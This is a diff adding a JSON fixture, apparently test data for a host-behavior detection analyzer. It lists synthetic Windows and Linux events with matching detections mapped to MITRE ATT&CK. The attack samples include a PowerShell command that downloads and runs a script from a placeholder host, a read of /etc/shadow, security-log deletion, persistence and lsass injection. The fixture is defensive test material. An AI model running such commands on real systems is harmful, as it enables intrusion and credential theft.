@@ -1,0 +1,1246 @@
+{
+  "normalized_events": [
+    {
+      "event_id": "evt-hb-001",
+      "timestamp": "2026-09-08T10:20:00Z",
+      "source_type": "host_log",
+      "source": "windows_sysmon",
+      "host": {
+        "hostname": "OFFICE01",
+        "ip": null,
+        "os": "windows"
+      },
+      "event_type": "process_create",
+      "subject": {
+        "type": "process",
+        "name": "notepad.exe",
+        "pid": 2100,
+        "user": "alice"
+      },
+      "object": null,
+      "network": null,
+      "action": "create_process",
+      "raw_data": {
+        "parent_pid": 1100,
+        "parent_process_name": "explorer.exe",
+        "command_line": "notepad.exe meeting-notes.txt"
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "normal",
+        "process"
+      ]
+    },
+    {
+      "event_id": "evt-hb-002",
+      "timestamp": "2026-09-08T10:20:05Z",
+      "source_type": "host_log",
+      "source": "linux_auditd",
+      "host": {
+        "hostname": "LINUX-SRV01",
+        "ip": null,
+        "os": "linux"
+      },
+      "event_type": "process_create",
+      "subject": {
+        "type": "process",
+        "name": "/usr/sbin/sshd",
+        "pid": 801,
+        "user": "root"
+      },
+      "object": null,
+      "network": null,
+      "action": "create_process",
+      "raw_data": {
+        "parent_pid": 1,
+        "parent_process_name": "systemd",
+        "command_line": "/usr/sbin/sshd -D"
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "normal",
+        "process"
+      ]
+    },
+    {
+      "event_id": "evt-hb-003",
+      "timestamp": "2026-09-08T10:20:10Z",
+      "source_type": "host_log",
+      "source": "windows_sysmon",
+      "host": {
+        "hostname": "OFFICE01",
+        "ip": null,
+        "os": "windows"
+      },
+      "event_type": "process_create",
+      "subject": {
+        "type": "process",
+        "name": "powershell.exe",
+        "pid": 3152,
+        "user": "alice"
+      },
+      "object": null,
+      "network": null,
+      "action": "create_process",
+      "raw_data": {
+        "parent_pid": 2200,
+        "parent_process_name": "WINWORD.EXE",
+        "command_line": "powershell.exe -EncodedCommand SQBFAFgA",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "attack",
+        "process"
+      ]
+    },
+    {
+      "event_id": "evt-hb-004",
+      "timestamp": "2026-09-08T10:20:15Z",
+      "source_type": "host_log",
+      "source": "linux_auditd",
+      "host": {
+        "hostname": "WEB01",
+        "ip": null,
+        "os": "linux"
+      },
+      "event_type": "process_create",
+      "subject": {
+        "type": "process",
+        "name": "/bin/sh",
+        "pid": 1440,
+        "user": "www-data"
+      },
+      "object": null,
+      "network": null,
+      "action": "create_process",
+      "raw_data": {
+        "parent_pid": 912,
+        "parent_process_name": "nginx",
+        "command_line": "/bin/sh -c id"
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "attack",
+        "process"
+      ]
+    },
+    {
+      "event_id": "evt-hb-005",
+      "timestamp": "2026-09-08T10:20:20Z",
+      "source_type": "host_log",
+      "source": "windows_sysmon",
+      "host": {
+        "hostname": "OFFICE01",
+        "ip": null,
+        "os": "windows"
+      },
+      "event_type": "process_create",
+      "subject": {
+        "type": "process",
+        "name": "powershell.exe",
+        "pid": 3180,
+        "user": "alice"
+      },
+      "object": null,
+      "network": null,
+      "action": "create_process",
+      "raw_data": {
+        "parent_pid": 1100,
+        "parent_process_name": "explorer.exe",
+        "command_line": "powershell.exe Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x/p')"
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "attack",
+        "process"
+      ]
+    },
+    {
+      "event_id": "evt-hb-006",
+      "timestamp": "2026-09-08T10:20:25Z",
+      "source_type": "host_behavior",
+      "source": "ebpf",
+      "host": {
+        "hostname": "LINUX-SRV01",
+        "ip": null,
+        "os": "linux"
+      },
+      "event_type": "process_create",
+      "subject": {
+        "type": "process",
+        "name": "/tmp/dropper.sh",
+        "pid": 1501,
+        "user": "www-data"
+      },
+      "object": null,
+      "network": null,
+      "action": "create_process",
+      "raw_data": {
+        "parent_pid": 1440,
+        "parent_process_name": "sh",
+        "command_line": "/tmp/dropper.sh",
+        "image": "/tmp/dropper.sh"
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "attack",
+        "process"
+      ]
+    },
+    {
+      "event_id": "evt-hb-007",
+      "timestamp": "2026-09-08T10:20:30Z",
+      "source_type": "host_log",
+      "source": "linux_auditd",
+      "host": {
+        "hostname": "LINUX-SRV01",
+        "ip": null,
+        "os": "linux"
+      },
+      "event_type": "file_read",
+      "subject": {
+        "type": "process",
+        "name": "/usr/bin/cat",
+        "pid": 1520,
+        "user": "www-data"
+      },
+      "object": {
+        "type": "file",
+        "name": "shadow",
+        "path": "/etc/shadow",
+        "pid": null
+      },
+      "network": null,
+      "action": "read_file",
+      "raw_data": {
+        "file_hash": null,
+        "result": "success"
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "attack",
+        "file"
+      ]
+    },
+    {
+      "event_id": "evt-hb-008",
+      "timestamp": "2026-09-08T10:20:35Z",
+      "source_type": "host_log",
+      "source": "linux_auditd",
+      "host": {
+        "hostname": "LINUX-SRV01",
+        "ip": null,
+        "os": "linux"
+      },
+      "event_type": "file_read",
+      "subject": {
+        "type": "process",
+        "name": "/usr/bin/cat",
+        "pid": 1520,
+        "user": "www-data"
+      },
+      "object": {
+        "type": "file",
+        "name": "report.txt",
+        "path": "/home/www-data/report.txt",
+        "pid": null
+      },
+      "network": null,
+      "action": "read_file",
+      "raw_data": {
+        "result": "success"
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "normal",
+        "file"
+      ]
+    },
+    {
+      "event_id": "evt-hb-009",
+      "timestamp": "2026-09-08T10:20:40Z",
+      "source_type": "host_log",
+      "source": "windows_sysmon",
+      "host": {
+        "hostname": "OFFICE01",
+        "ip": null,
+        "os": "windows"
+      },
+      "event_type": "file_modify",
+      "subject": {
+        "type": "process",
+        "name": "powershell.exe",
+        "pid": 3180,
+        "user": "alice"
+      },
+      "object": {
+        "type": "file",
+        "name": "update.cmd",
+        "path": "C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.cmd",
+        "pid": null
+      },
+      "network": null,
+      "action": "write_file",
+      "raw_data": {
+        "file_hash": "sha256:demo-persistence"
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "attack",
+        "file"
+      ]
+    },
+    {
+      "event_id": "evt-hb-010",
+      "timestamp": "2026-09-08T10:20:45Z",
+      "source_type": "host_log",
+      "source": "windows_sysmon",
+      "host": {
+        "hostname": "OFFICE01",
+        "ip": null,
+        "os": "windows"
+      },
+      "event_type": "file_delete",
+      "subject": {
+        "type": "process",
+        "name": "wevtutil.exe",
+        "pid": 3201,
+        "user": "administrator"
+      },
+      "object": {
+        "type": "file",
+        "name": "Security.evtx",
+        "path": "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
+        "pid": null
+      },
+      "network": null,
+      "action": "delete_file",
+      "raw_data": {
+        "result": "success"
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "attack",
+        "file"
+      ]
+    },
+    {
+      "event_id": "evt-hb-011",
+      "timestamp": "2026-09-08T10:20:50Z",
+      "source_type": "host_behavior",
+      "source": "ebpf",
+      "host": {
+        "hostname": "LINUX-SRV01",
+        "ip": null,
+        "os": "linux"
+      },
+      "event_type": "file_create",
+      "subject": {
+        "type": "process",
+        "name": "/usr/bin/curl",
+        "pid": 1530,
+        "user": "www-data"
+      },
+      "object": {
+        "type": "file",
+        "name": "payload.sh",
+        "path": "/tmp/payload.sh",
+        "pid": null
+      },
+      "network": null,
+      "action": "write_file",
+      "raw_data": {
+        "file_hash": "sha256:demo-payload"
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "attack",
+        "file"
+      ]
+    },
+    {
+      "event_id": "evt-hb-012",
+      "timestamp": "2026-09-08T10:20:55Z",
+      "source_type": "host_log",
+      "source": "windows_sysmon",
+      "host": {
+        "hostname": "OFFICE01",
+        "ip": null,
+        "os": "windows"
+      },
+      "event_type": "file_create",
+      "subject": {
+        "type": "process",
+        "name": "winword.exe",
+        "pid": 2200,
+        "user": "alice"
+      },
+      "object": {
+        "type": "file",
+        "name": "report.docx",
+        "path": "C:\\Users\\alice\\Documents\\report.docx",
+        "pid": null
+      },
+      "network": null,
+      "action": "write_file",
+      "raw_data": {
+        "result": "success"
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "normal",
+        "file"
+      ]
+    },
+    {
+      "event_id": "evt-hb-013",
+      "timestamp": "2026-09-08T10:21:00Z",
+      "source_type": "host_log",
+      "source": "windows_sysmon",
+      "host": {
+        "hostname": "OFFICE01",
+        "ip": null,
+        "os": "windows"
+      },
+      "event_type": "file_modify",
+      "subject": {
+        "type": "process",
+        "name": "winword.exe",
+        "pid": 2200,
+        "user": "alice"
+      },
+      "object": {
+        "type": "file",
+        "name": "report.docx",
+        "path": "C:\\Users\\alice\\Documents\\report.docx",
+        "pid": null
+      },
+      "network": null,
+      "action": "write_file",
+      "raw_data": {
+        "result": "success"
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "normal",
+        "file"
+      ]
+    },
+    {
+      "event_id": "evt-hb-014",
+      "timestamp": "2026-09-08T10:21:05Z",
+      "source_type": "host_log",
+      "source": "linux_auditd",
+      "host": {
+        "hostname": "LINUX-SRV01",
+        "ip": null,
+        "os": "linux"
+      },
+      "event_type": "file_delete",
+      "subject": {
+        "type": "process",
+        "name": "/usr/bin/rm",
+        "pid": 1600,
+        "user": "www-data"
+      },
+      "object": {
+        "type": "file",
+        "name": "note.tmp",
+        "path": "/tmp/note.tmp",
+        "pid": null
+      },
+      "network": null,
+      "action": "delete_file",
+      "raw_data": {
+        "result": "success"
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "normal",
+        "file"
+      ]
+    },
+    {
+      "event_id": "evt-hb-015",
+      "timestamp": "2026-09-08T10:21:10Z",
+      "source_type": "host_behavior",
+      "source": "ebpf",
+      "host": {
+        "hostname": "LINUX-SRV01",
+        "ip": null,
+        "os": "linux"
+      },
+      "event_type": "system_call",
+      "subject": {
+        "type": "process",
+        "name": "/tmp/debugger",
+        "pid": 1700,
+        "user": "www-data"
+      },
+      "object": null,
+      "network": null,
+      "action": "ptrace",
+      "raw_data": {
+        "syscall": "ptrace",
+        "arguments": {
+          "request": "PTRACE_ATTACH",
+          "target_pid": 801
+        },
+        "result": 0
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "attack",
+        "syscall"
+      ]
+    },
+    {
+      "event_id": "evt-hb-016",
+      "timestamp": "2026-09-08T10:21:15Z",
+      "source_type": "host_behavior",
+      "source": "ebpf",
+      "host": {
+        "hostname": "LINUX-SRV01",
+        "ip": null,
+        "os": "linux"
+      },
+      "event_type": "system_call",
+      "subject": {
+        "type": "process",
+        "name": "/tmp/loader",
+        "pid": 1750,
+        "user": "www-data"
+      },
+      "object": null,
+      "network": null,
+      "action": "memfd_create",
+      "raw_data": {
+        "syscall": "memfd_create",
+        "arguments": {
+          "name": "payload"
+        },
+        "result": 3
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "attack",
+        "syscall"
+      ]
+    },
+    {
+      "event_id": "evt-hb-017",
+      "timestamp": "2026-09-08T10:21:19Z",
+      "source_type": "host_behavior",
+      "source": "ebpf",
+      "host": {
+        "hostname": "LINUX-SRV01",
+        "ip": null,
+        "os": "linux"
+      },
+      "event_type": "system_call",
+      "subject": {
+        "type": "process",
+        "name": "/tmp/loader",
+        "pid": 1750,
+        "user": "www-data"
+      },
+      "object": null,
+      "network": null,
+      "action": "execve",
+      "raw_data": {
+        "syscall": "execve",
+        "arguments": {
+          "path": "/proc/self/fd/3"
+        },
+        "result": 0
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "attack",
+        "syscall"
+      ]
+    },
+    {
+      "event_id": "evt-hb-018",
+      "timestamp": "2026-09-08T10:21:25Z",
+      "source_type": "host_behavior",
+      "source": "ebpf",
+      "host": {
+        "hostname": "LINUX-SRV01",
+        "ip": null,
+        "os": "linux"
+      },
+      "event_type": "system_call",
+      "subject": {
+        "type": "process",
+        "name": "/usr/bin/python3",
+        "pid": 1800,
+        "user": "student"
+      },
+      "object": null,
+      "network": null,
+      "action": "openat",
+      "raw_data": {
+        "syscall": "openat",
+        "arguments": {
+          "path": "/home/student/app.py"
+        },
+        "result": 4
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "normal",
+        "syscall"
+      ]
+    },
+    {
+      "event_id": "evt-hb-019",
+      "timestamp": "2026-09-08T10:21:30Z",
+      "source_type": "host_log",
+      "source": "windows_sysmon",
+      "host": {
+        "hostname": "OFFICE01",
+        "ip": null,
+        "os": "windows"
+      },
+      "event_type": "remote_thread_create",
+      "subject": {
+        "type": "process",
+        "name": "injector.exe",
+        "pid": 4100,
+        "user": "alice"
+      },
+      "object": {
+        "type": "process",
+        "name": "lsass.exe",
+        "path": null,
+        "pid": 700
+      },
+      "network": null,
+      "action": "create_remote_thread",
+      "raw_data": {
+        "start_address": "0x000001F00000",
+        "call_trace": [
+          "kernel32.dll",
+          "ntdll.dll"
+        ]
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "attack",
+        "memory"
+      ]
+    },
+    {
+      "event_id": "evt-hb-020",
+      "timestamp": "2026-09-08T10:21:35Z",
+      "source_type": "host_behavior",
+      "source": "ebpf",
+      "host": {
+        "hostname": "LINUX-SRV01",
+        "ip": null,
+        "os": "linux"
+      },
+      "event_type": "system_call",
+      "subject": {
+        "type": "process",
+        "name": "/tmp/injector",
+        "pid": 1900,
+        "user": "www-data"
+      },
+      "object": null,
+      "network": null,
+      "action": "process_vm_writev",
+      "raw_data": {
+        "syscall": "process_vm_writev",
+        "arguments": {
+          "target_pid": 801,
+          "bytes": 512
+        },
+        "result": 512
+      },
+      "severity": "info",
+      "attack": null,
+      "tags": [
+        "attack",
+        "syscall",
+        "memory"
+      ]
+    }
+  ],
+  "detection_results": [
+    {
+      "detection_id": "det-df432e26-660a-52ce-850d-2a356d90cdc1",
+      "timestamp": "2026-09-08T10:20:10Z",
+      "analyzer": "host_behavior_analyzer",
+      "detection_type": "suspicious_behavior",
+      "title": "Document application spawned a command interpreter",
+      "description": "A document or email application created a shell or script interpreter, which is uncommon in normal office workflows.",
+      "severity": "high",
+      "confidence": 0.88,
+      "related_event_ids": [
+        "evt-hb-003"
+      ],
+      "related_entity_ids": [
+        "process:OFFICE01:2200",
+        "process:OFFICE01:3152"
+      ],
+      "evidence": {
+        "rule_id": "HB-PROC-001",
+        "pid": 3152,
+        "ppid": 2200,
+        "process_name": "powershell.exe",
+        "process_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "parent_process": "winword.exe",
+        "command_line": "powershell.exe -EncodedCommand SQBFAFgA",
+        "matched_conditions": [
+          "document_process_parent",
+          "shell_or_script_child"
+        ]
+      },
+      "attack_technique_id": "T1059.001",
+      "tags": [
+        "HB-PROC-001",
+        "host_behavior",
+        "process",
+        "execution",
+        "suspicious_parent_child",
+        "attack_technique:T1059.001",
+        "attack_tactic:TA0002",
+        "attack_stage:execution"
+      ]
+    },
+    {
+      "detection_id": "det-8c1cf625-d031-557b-aa2d-2356103a2593",
+      "timestamp": "2026-09-08T10:20:10Z",
+      "analyzer": "host_behavior_analyzer",
+      "detection_type": "suspicious_behavior",
+      "title": "Suspicious process command line",
+      "description": "The process command line contains execution or decoding patterns commonly used by malicious scripts.",
+      "severity": "high",
+      "confidence": 0.82,
+      "related_event_ids": [
+        "evt-hb-003"
+      ],
+      "related_entity_ids": [
+        "user:OFFICE01:alice",
+        "process:OFFICE01:3152"
+      ],
+      "evidence": {
+        "rule_id": "HB-PROC-003",
+        "pid": 3152,
+        "ppid": 2200,
+        "process_name": "powershell.exe",
+        "process_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "parent_process": "winword.exe",
+        "command_line": "powershell.exe -EncodedCommand SQBFAFgA",
+        "matched_conditions": [
+          "encoded PowerShell command"
+        ]
+      },
+      "attack_technique_id": "T1059.001",
+      "tags": [
+        "HB-PROC-003",
+        "host_behavior",
+        "process",
+        "execution",
+        "command_line",
+        "attack_technique:T1059.001",
+        "attack_tactic:TA0002",
+        "attack_stage:execution"
+      ]
+    },
+    {
+      "detection_id": "det-11943852-c424-5bbd-b12b-b4983361f189",
+      "timestamp": "2026-09-08T10:20:15Z",
+      "analyzer": "host_behavior_analyzer",
+      "detection_type": "suspicious_behavior",
+      "title": "Web service spawned a command interpreter",
+      "description": "A web-facing service created a shell or script interpreter; this may indicate exploitation or web-shell activity.",
+      "severity": "critical",
+      "confidence": 0.93,
+      "related_event_ids": [
+        "evt-hb-004"
+      ],
+      "related_entity_ids": [
+        "process:WEB01:912",
+        "process:WEB01:1440"
+      ],
+      "evidence": {
+        "rule_id": "HB-PROC-002",
+        "pid": 1440,
+        "ppid": 912,
+        "process_name": "sh",
+        "process_image": "/bin/sh",
+        "parent_process": "nginx",
+        "command_line": "/bin/sh -c id",
+        "matched_conditions": [
+          "web_service_parent",
+          "shell_or_script_child"
+        ]
+      },
+      "attack_technique_id": "T1190",
+      "tags": [
+        "HB-PROC-002",
+        "host_behavior",
+        "process",
+        "initial_access",
+        "execution",
+        "web_service",
+        "shell",
+        "attack_technique:T1190",
+        "attack_tactic:TA0001",
+        "attack_stage:initial_access"
+      ]
+    },
+    {
+      "detection_id": "det-7e8b1313-df36-5691-91d1-5bbf5dc3a815",
+      "timestamp": "2026-09-08T10:20:20Z",
+      "analyzer": "host_behavior_analyzer",
+      "detection_type": "suspicious_behavior",
+      "title": "Suspicious process command line",
+      "description": "The process command line contains execution or decoding patterns commonly used by malicious scripts.",
+      "severity": "high",
+      "confidence": 0.82,
+      "related_event_ids": [
+        "evt-hb-005"
+      ],
+      "related_entity_ids": [
+        "user:OFFICE01:alice",
+        "process:OFFICE01:3180"
+      ],
+      "evidence": {
+        "rule_id": "HB-PROC-003",
+        "pid": 3180,
+        "ppid": 1100,
+        "process_name": "powershell.exe",
+        "process_image": "powershell.exe",
+        "parent_process": "explorer.exe",
+        "command_line": "powershell.exe Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x/p')",
+        "matched_conditions": [
+          "dynamic PowerShell execution",
+          "in-memory download"
+        ]
+      },
+      "attack_technique_id": "T1059.001",
+      "tags": [
+        "HB-PROC-003",
+        "host_behavior",
+        "process",
+        "execution",
+        "command_line",
+        "attack_technique:T1059.001",
+        "attack_tactic:TA0002",
+        "attack_stage:execution"
+      ]
+    },
+    {
+      "detection_id": "det-b6bc33fc-4d7a-584c-92ce-a66803ff6306",
+      "timestamp": "2026-09-08T10:20:25Z",
+      "analyzer": "host_behavior_analyzer",
+      "detection_type": "suspicious_behavior",
+      "title": "Executable launched from a temporary directory",
+      "description": "A script or executable was launched from a user or system temporary directory.",
+      "severity": "medium",
+      "confidence": 0.72,
+      "related_event_ids": [
+        "evt-hb-006"
+      ],
+      "related_entity_ids": [
+        "user:LINUX-SRV01:www-data",
+        "process:LINUX-SRV01:1501"
+      ],
+      "evidence": {
+        "rule_id": "HB-PROC-004",
+        "pid": 1501,
+        "ppid": 1440,
+        "process_name": "dropper.sh",
+        "process_image": "/tmp/dropper.sh",
+        "parent_process": "sh",
+        "command_line": "/tmp/dropper.sh",
+        "matched_conditions": [
+          "executable_or_script",
+          "temporary_directory"
+        ]
+      },
+      "attack_technique_id": "T1059.004",
+      "tags": [
+        "HB-PROC-004",
+        "host_behavior",
+        "process",
+        "execution",
+        "temporary_directory",
+        "attack_technique:T1059.004",
+        "attack_tactic:TA0002",
+        "attack_stage:execution"
+      ]
+    },
+    {
+      "detection_id": "det-a86dde0c-640d-545d-a45e-011aa937aa1d",
+      "timestamp": "2026-09-08T10:20:30Z",
+      "analyzer": "host_behavior_analyzer",
+      "detection_type": "suspicious_behavior",
+      "title": "Sensitive file read",
+      "description": "A process read an operating-system or user credential file.",
+      "severity": "high",
+      "confidence": 0.86,
+      "related_event_ids": [
+        "evt-hb-007"
+      ],
+      "related_entity_ids": [
+        "process:LINUX-SRV01:1520",
+        "file:LINUX-SRV01:/etc/shadow"
+      ],
+      "evidence": {
+        "rule_id": "HB-FILE-001",
+        "file_path": "/etc/shadow",
+        "operation": "read_file",
+        "process_id": 1520,
+        "file_hash": null,
+        "matched_conditions": [
+          "sensitive_path",
+          "read_operation"
+        ]
+      },
+      "attack_technique_id": "T1003",
+      "tags": [
+        "HB-FILE-001",
+        "host_behavior",
+        "file",
+        "credential_access",
+        "attack_technique:T1003",
+        "attack_tactic:TA0006",
+        "attack_stage:credential_access"
+      ]
+    },
+    {
+      "detection_id": "det-17e2a03b-cb9a-5c9b-9ded-9b558707cc1b",
+      "timestamp": "2026-09-08T10:20:40Z",
+      "analyzer": "host_behavior_analyzer",
+      "detection_type": "suspicious_behavior",
+      "title": "Persistence-related file modification",
+      "description": "A process created or modified a file in an automatic startup or service configuration location.",
+      "severity": "high",
+      "confidence": 0.84,
+      "related_event_ids": [
+        "evt-hb-009"
+      ],
+      "related_entity_ids": [
+        "process:OFFICE01:3180",
+        "file:OFFICE01:C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.cmd"
+      ],
+      "evidence": {
+        "rule_id": "HB-FILE-002",
+        "file_path": "C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.cmd",
+        "operation": "write_file",
+        "process_id": 3180,
+        "file_hash": "sha256:demo-persistence",
+        "matched_conditions": [
+          "persistence_path",
+          "create_or_modify_operation"
+        ]
+      },
+      "attack_technique_id": "T1547",
+      "tags": [
+        "HB-FILE-002",
+        "host_behavior",
+        "file",
+        "persistence",
+        "attack_technique:T1547",
+        "attack_tactic:TA0003",
+        "attack_stage:persistence"
+      ]
+    },
+    {
+      "detection_id": "det-eb213394-1e77-55c7-bcbc-197f69a0c391",
+      "timestamp": "2026-09-08T10:20:45Z",
+      "analyzer": "host_behavior_analyzer",
+      "detection_type": "malicious_behavior",
+      "title": "Security log file deleted",
+      "description": "A process deleted a host security or authentication log.",
+      "severity": "critical",
+      "confidence": 0.94,
+      "related_event_ids": [
+        "evt-hb-010"
+      ],
+      "related_entity_ids": [
+        "process:OFFICE01:3201",
+        "file:OFFICE01:C:\\Windows\\System32\\winevt\\Logs\\Security.evtx"
+      ],
+      "evidence": {
+        "rule_id": "HB-FILE-003",
+        "file_path": "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
+        "operation": "delete_file",
+        "process_id": 3201,
+        "file_hash": null,
+        "matched_conditions": [
+          "security_log_path",
+          "delete_operation"
+        ]
+      },
+      "attack_technique_id": "T1070",
+      "tags": [
+        "HB-FILE-003",
+        "host_behavior",
+        "file",
+        "defense_evasion",
+        "log_deletion",
+        "attack_technique:T1070",
+        "attack_tactic:TA0005",
+        "attack_stage:defense_evasion"
+      ]
+    },
+    {
+      "detection_id": "det-deac1185-9320-5ea5-bb15-b8758488d3d4",
+      "timestamp": "2026-09-08T10:20:50Z",
+      "analyzer": "host_behavior_analyzer",
+      "detection_type": "suspicious_behavior",
+      "title": "Executable written to a temporary directory",
+      "description": "A script or executable was written to a user or system temporary directory.",
+      "severity": "medium",
+      "confidence": 0.7,
+      "related_event_ids": [
+        "evt-hb-011"
+      ],
+      "related_entity_ids": [
+        "process:LINUX-SRV01:1530",
+        "file:LINUX-SRV01:/tmp/payload.sh"
+      ],
+      "evidence": {
+        "rule_id": "HB-FILE-004",
+        "file_path": "/tmp/payload.sh",
+        "operation": "write_file",
+        "process_id": 1530,
+        "file_hash": "sha256:demo-payload",
+        "matched_conditions": [
+          "executable_or_script",
+          "temporary_directory",
+          "create_or_modify_operation"
+        ]
+      },
+      "attack_technique_id": "T1105",
+      "tags": [
+        "HB-FILE-004",
+        "host_behavior",
+        "file",
+        "execution",
+        "temporary_directory",
+        "attack_technique:T1105",
+        "attack_tactic:TA0011",
+        "attack_stage:command_and_control"
+      ]
+    },
+    {
+      "detection_id": "det-909379a4-8137-5aeb-94e9-38f342d01f80",
+      "timestamp": "2026-09-08T10:21:10Z",
+      "analyzer": "host_behavior_analyzer",
+      "detection_type": "suspicious_behavior",
+      "title": "Process tracing or memory access",
+      "description": "The process invoked the high-risk system call ptrace; review its arguments and surrounding events.",
+      "severity": "medium",
+      "confidence": 0.72,
+      "related_event_ids": [
+        "evt-hb-015"
+      ],
+      "related_entity_ids": [
+        "process:LINUX-SRV01:1700",
+        "process:LINUX-SRV01:801"
+      ],
+      "evidence": {
+        "rule_id": "HB-SYSCALL-001",
+        "syscall": "ptrace",
+        "pid": 1700,
+        "target_pid": 801,
+        "operation": "ptrace",
+        "arguments": {
+          "request": "PTRACE_ATTACH",
+          "target_pid": 801
+        },
+        "result": 0,
+        "matched_conditions": [
+          "high_risk_syscall"
+        ]
+      },
+      "attack_technique_id": "T1055",
+      "tags": [
+        "HB-SYSCALL-001",
+        "host_behavior",
+        "syscall",
+        "execution",
+        "high_risk",
+        "attack_technique:T1055",
+        "attack_tactic:TA0004",
+        "attack_stage:privilege_escalation",
+        "attack_tactic:TA0005",
+        "attack_stage:defense_evasion"
+      ]
+    },
+    {
+      "detection_id": "det-4f0096d2-a139-53ed-ac03-59165b663887",
+      "timestamp": "2026-09-08T10:21:19Z",
+      "analyzer": "host_behavior_analyzer",
+      "detection_type": "malicious_behavior",
+      "title": "Anonymous in-memory file executed",
+      "description": "A process called memfd_create and then executed a file within the configured sequence window.",
+      "severity": "high",
+      "confidence": 0.9,
+      "related_event_ids": [
+        "evt-hb-016",
+        "evt-hb-017"
+      ],
+      "related_entity_ids": [
+        "host:LINUX-SRV01",
+        "process:LINUX-SRV01:1750"
+      ],
+      "evidence": {
+        "rule_id": "HB-SYSCALL-002",
+        "sequence": [
+          "memfd_create",
+          "execve"
+        ],
+        "elapsed_seconds": 4.0,
+        "time_delta_seconds": 4.0,
+        "window_seconds": 30,
+        "pid": 1750,
+        "operation": "memory_file_execution",
+        "matched_conditions": [
+          "memfd_create",
+          "execve",
+          "same_host_and_process",
+          "within_time_window"
+        ]
+      },
+      "attack_technique_id": "T1620",
+      "tags": [
+        "HB-SYSCALL-002",
+        "host_behavior",
+        "syscall",
+        "execution",
+        "defense_evasion",
+        "memory_execution",
+        "attack_technique:T1620",
+        "attack_tactic:TA0005",
+        "attack_stage:defense_evasion"
+      ]
+    },
+    {
+      "detection_id": "det-65dcf4ab-65da-5407-9171-6d084e8cb363",
+      "timestamp": "2026-09-08T10:21:30Z",
+      "analyzer": "host_behavior_analyzer",
+      "detection_type": "malicious_behavior",
+      "title": "Explicit cross-process memory behavior",
+      "description": "Host telemetry reported process injection, remote thread creation or a cross-process memory write.",
+      "severity": "critical",
+      "confidence": 0.95,
+      "related_event_ids": [
+        "evt-hb-019"
+      ],
+      "related_entity_ids": [
+        "process:OFFICE01:4100",
+        "process:OFFICE01:700"
+      ],
+      "evidence": {
+        "rule_id": "HB-MEM-001",
+        "pid": 4100,
+        "target_pid": 700,
+        "process_name": "injector.exe",
+        "event_type": "remote_thread_create",
+        "operation": "create_remote_thread",
+        "source": "windows_sysmon",
+        "matched_conditions": [
+          "remote_thread_create"
+        ],
+        "raw_data": {
+          "start_address": "0x000001F00000",
+          "call_trace": [
+            "kernel32.dll",
+            "ntdll.dll"
+          ]
+        }
+      },
+      "attack_technique_id": "T1055",
+      "tags": [
+        "HB-MEM-001",
+        "host_behavior",
+        "memory",
+        "execution",
+        "process_injection",
+        "attack_technique:T1055",
+        "attack_tactic:TA0004",
+        "attack_stage:privilege_escalation",
+        "attack_tactic:TA0005",
+        "attack_stage:defense_evasion"
+      ]
+    },
+    {
+      "detection_id": "det-b7bafa75-fab2-5bfa-a2bc-05c8b17eea08",
+      "timestamp": "2026-09-08T10:21:35Z",
+      "analyzer": "host_behavior_analyzer",
+      "detection_type": "suspicious_behavior",
+      "title": "Cross-process memory write",
+      "description": "The process invoked the high-risk system call process_vm_writev; review its arguments and surrounding events.",
+      "severity": "high",
+      "confidence": 0.9,
+      "related_event_ids": [
+        "evt-hb-020"
+      ],
+      "related_entity_ids": [
+        "process:LINUX-SRV01:1900",
+        "process:LINUX-SRV01:801"
+      ],
+      "evidence": {
+        "rule_id": "HB-SYSCALL-001",
+        "syscall": "process_vm_writev",
+        "pid": 1900,
+        "target_pid": 801,
+        "operation": "process_vm_writev",
+        "arguments": {
+          "target_pid": 801,
+          "bytes": 512
+        },
+        "result": 512,
+        "matched_conditions": [
+          "high_risk_syscall"
+        ]
+      },
+      "attack_technique_id": "T1055",
+      "tags": [
+        "HB-SYSCALL-001",
+        "host_behavior",
+        "syscall",
+        "execution",
+        "high_risk",
+        "attack_technique:T1055",
+        "attack_tactic:TA0004",
+        "attack_stage:privilege_escalation",
+        "attack_tactic:TA0005",
+        "attack_stage:defense_evasion"
+      ]
+    }
+  ],
+  "coverage": {
+    "total_events": 20,
+    "total_detections": 13,
+    "missing_related_event_ids": []
+  }
+}
